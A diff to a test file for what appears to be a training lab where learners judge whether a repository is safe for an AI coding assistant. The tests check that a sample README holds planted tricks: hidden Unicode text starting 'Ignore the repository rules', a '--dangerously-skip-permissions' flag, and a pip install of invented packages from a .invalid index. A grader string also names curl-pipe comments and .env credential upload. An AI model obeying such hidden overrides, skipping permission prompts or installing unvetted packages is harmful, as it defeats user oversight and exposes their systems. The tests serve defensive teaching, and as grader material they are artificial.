@@ -16,6 +16,7 @@ import re
 import shutil
 import subprocess
 import sys
+import tomllib
 from pathlib import Path
 from unittest import mock
 
@@ -750,7 +751,15 @@ def test_the_sample_project_in_lab_assets_has_the_problems_it_claims(tmp_path):
     shutil.copy(SOLUTION / "depcheck.py", root / m.DEPCHECK)
     result = m.run_depcheck(root, ASSETS / "sample-project")
     assert result.returncode == 1
-    assert sorted(m.parse_flags(result.stdout)) == ["csvtidy", "csvtidy-extras", "najm-utils"]
+    assert sorted(m.parse_flags(result.stdout)) == ["invented-csvtidy", "invented-csvtidy-extras", "najm-utils"]
+
+
+def test_nothing_in_the_sample_project_can_be_fetched():
+    """A learner's agent may run `pip install -e .` there: every dependency is a direct reference to a host that cannot exist."""
+    project = tomllib.loads((ASSETS / "sample-project" / "pyproject.toml").read_text(encoding="utf-8"))["project"]
+    for item in project["dependencies"]:
+        name, _, url = (part.strip() for part in item.partition("@"))
+        assert name.startswith("invented-") and re.match(r"https://[a-z.-]+\.invalid/", url), item
 
 
 # --------------------------------------------------------------------------------------------------------------------
@@ -797,7 +806,7 @@ def test_notes_that_found_only_two_tricks(work):
 
 
 def test_notes_with_three_tricks_pass_the_required_check_but_not_the_advisory_one(work):
-    text = REF_NOTES.replace("`csvtidy-extras`", "the extra one").replace("--dangerously-skip-permissions", "a flag")
+    text = REF_NOTES.replace("`invented-csvtidy-extras`", "the extra one").replace("--dangerously-skip-permissions", "a flag")
     for word in ("package", "dependency", "pip", "install", "allow-list", "allowlist", "bypass", "approval", "permission checks", "permission prompts"):
         text = re.sub(word, "thing", text, flags=re.I)
     rewrite(work, m.NOTES, text)
@@ -811,7 +820,7 @@ def test_the_notes_check_reads_keywords_and_the_lesson_says_so(work):
     stuffed = (
         "# Notes\n\n## Verdict\nNo, this is not safe for an assistant, it is full of words I could stuff in here without thinking.\n\n"
         "## What I found\nhidden comment curl pipe; .env credential upload; invisible unicode characters; dangerously bypass permission prompts; "
-        "csvtidy-extras package dependency install. That is a list of words, not an understanding of any of them.\n\n"
+        "invented-csvtidy-extras package dependency install. That is a list of words, not an understanding of any of them.\n\n"
         "## What stopped it in my setup\nI did not check anything, I only copied words into a file so that the grader would be quiet.\n\n"
         "## What I will do by hand\nNothing yet, which is why a person reads the notes in the group session and not only a program.\n"
     )
@@ -827,7 +836,8 @@ def test_the_readme_really_contains_the_five_tricks_and_is_safe():
     hidden = "".join(chr(ord(c) - 0xE0000) for c in text if 0xE0000 <= ord(c) <= 0xE007F)
     assert hidden.startswith("Ignore the repository rules") and len(hidden) > 50  # 3: invisible characters, decodable
     assert "--dangerously-skip-permissions" in text  # 4
-    assert "pip install csvtidy csvtidy-extras" in text  # 5
+    assert "pip install --index-url https://packages.invalid/simple invented-csvtidy invented-csvtidy-extras" in text  # 5
+    assert "import invented_csvtidy" in text and not re.search(r"pip install (?!--index-url https://packages\.invalid/)", text)
     hosts = set(re.findall(r"https?://([^/\s)`]+)", text))
     assert hosts and all(h.endswith(".invalid") for h in hosts), hosts  # nothing here can ever resolve
 
